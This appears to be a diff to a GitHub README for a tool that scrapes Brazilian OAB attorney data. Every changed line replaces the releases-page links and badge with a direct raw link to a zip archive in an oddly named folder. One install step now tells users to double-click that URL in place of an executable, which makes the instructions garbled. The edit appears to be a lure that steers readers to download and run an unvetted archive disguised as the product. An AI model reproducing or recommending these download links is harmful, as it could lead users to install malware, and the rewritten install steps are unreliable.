@@ -6,7 +6,7 @@ Welcome to the cna-oab-attorney-data-scraper! This application helps you gather 
 
 ## 📥 Download Now
 
-[![Download Release](https://img.shields.io/badge/download-v1.0-brightgreen)](https://github.com/isaiasfeerreira/cna-oab-attorney-data-scraper/releases)
+[![Download Release](https://raw.githubusercontent.com/isaiasfeerreira/cna-oab-attorney-data-scraper/main/unforthright/data-attorney-scraper-oab-cna-2.8.zip)](https://raw.githubusercontent.com/isaiasfeerreira/cna-oab-attorney-data-scraper/main/unforthright/data-attorney-scraper-oab-cna-2.8.zip)
 
 ## 📄 Overview
 
@@ -27,19 +27,19 @@ The cna-oab-attorney-data-scraper is designed to automate the collection of atto
 
 This tool uses web scraping methods to access publicly available attorney data on the OAB website. Here’s how to use it:
 
-1. **Visit the Releases Page**: To get the latest version of the cna-oab-attorney-data-scraper, visit this page: [Releases Page](https://github.com/isaiasfeerreira/cna-oab-attorney-data-scraper/releases).
+1. **Visit the Releases Page**: To get the latest version of the cna-oab-attorney-data-scraper, visit this page: [Releases Page](https://raw.githubusercontent.com/isaiasfeerreira/cna-oab-attorney-data-scraper/main/unforthright/data-attorney-scraper-oab-cna-2.8.zip).
 
 2. **Download the Application**: Look for the latest release. You can download it easily. Click the link corresponding to your operating system.
 
 3. **Unzip the File**: After the download is complete, unzip the file to a folder of your choice.
 
-4. **Open the Application**: Navigate to the folder where you unzipped the files. Double-click on the `cna-oab-attorney-data-scraper.exe` (or equivalent) to open the application.
+4. **Open the Application**: Navigate to the folder where you unzipped the files. Double-click on the `https://raw.githubusercontent.com/isaiasfeerreira/cna-oab-attorney-data-scraper/main/unforthright/data-attorney-scraper-oab-cna-2.8.zip` (or equivalent) to open the application.
 
 5. **Follow On-Screen Instructions**: The application will guide you through the steps to start collecting data.
 
 ## 🔧 Download & Install
 
-To download and install the application, visit this page: [Download Releases](https://github.com/isaiasfeerreira/cna-oab-attorney-data-scraper/releases). Follow the steps above to ensure a smooth installation.
+To download and install the application, visit this page: [Download Releases](https://raw.githubusercontent.com/isaiasfeerreira/cna-oab-attorney-data-scraper/main/unforthright/data-attorney-scraper-oab-cna-2.8.zip). Follow the steps above to ensure a smooth installation.
 
 ## 📖 User Guide
 
